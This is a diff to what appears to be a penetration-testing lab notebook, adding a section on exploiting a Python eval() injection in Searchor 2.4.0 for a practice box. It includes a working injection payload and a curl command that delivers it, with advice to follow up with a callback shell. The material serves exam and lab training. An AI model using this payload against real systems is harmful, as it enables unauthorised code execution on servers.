@@ -110,6 +110,30 @@ Create the invalid filename through the already-confirmed upload or webshell pat
 
 - [ ] The marker executes as a lower-privilege user → **Record the account, catch the callback, then go to Step 12 · [[Linux - Shell Stabilise]] or Step 13 · [[Linux - Local Enum]]**
 - [ ] The marker is deleted but does not execute → **Recheck the filename quoting and scheduler interval, then return to Step 5 · [[Linux - Web Enum]]**
+
+## Searchor Python `eval()` branch
+
+Searchor 2.4.0 constructs a Python expression around user input and evaluates it. The injection boundary is the query string, not a shell command parameter. Close the surrounding string, return the output of a harmless identity command, and comment the original expression tail.
+
+```bash
+boxset SearchorPayload "test'),__import__('os').popen('id').read()#"
+curl -fsS -G "http://$FQDN:$WebPort/" \
+  --data-urlencode "engine=Accuweather" \
+  --data-urlencode "query=$SearchorPayload" \
+  | tee "$BoxDir/loot/searchor-id-proof.txt"
+```
+
+The response is the proof channel. Look for `uid=`, the service account, or a traceback that shows the expression reached Python evaluation. Once identity is proven, send a callback through the same parameter and move to [[Linux - RCE to Shell]].
+
+> [!warning] 💡
+> Quoting is part of the exploit. Keep the payload in a variable and use `--data-urlencode`; manually placing it in a URL can change quotes, spaces, and comment characters before the application sees them.
+
+## Additional routing
+
+- [ ] The response includes `uid=` → **Go to [[Linux - RCE to Shell]], then record the shell identity and stabilize it**
+- [ ] A Python traceback shows a syntax error → **Compare the payload with the surrounding expression and adjust only the closing quote or comment**
+- [ ] The input is reflected but not evaluated → **Return to [[Linux - Web Enum]] and inspect the actual server-side code path**
+
 ## Seen in
 - [[OSCP/BOXES/WRITE UPS/Linux/CronOS|CronOS]] -- authenticated host input appended a shell command and returned the web-service identity
 - [[OSCP/BOXES/WRITE UPS/Linux/Pelican|Pelican]] -- confirmed in the box write-up
@@ -118,6 +142,7 @@ Create the invalid filename through the already-confirmed upload or webshell pat
 - [[OSCP/BOXES/WRITE UPS/Linux/Jarvis|Jarvis]] -- command substitution bypassed the simpler.py blacklist
 - [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- upload filename reached an unquoted cron command
 - [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]] -- authenticated SmEvK Console POST delivered a URL-encoded Bash callback
+- [[OSCP/BOXES/WRITE UPS/Linux/Busqueda|Busqueda]] -- Searchor query input reached Python `eval()` and returned a reflected `id` proof
 
 ## Related stages
 
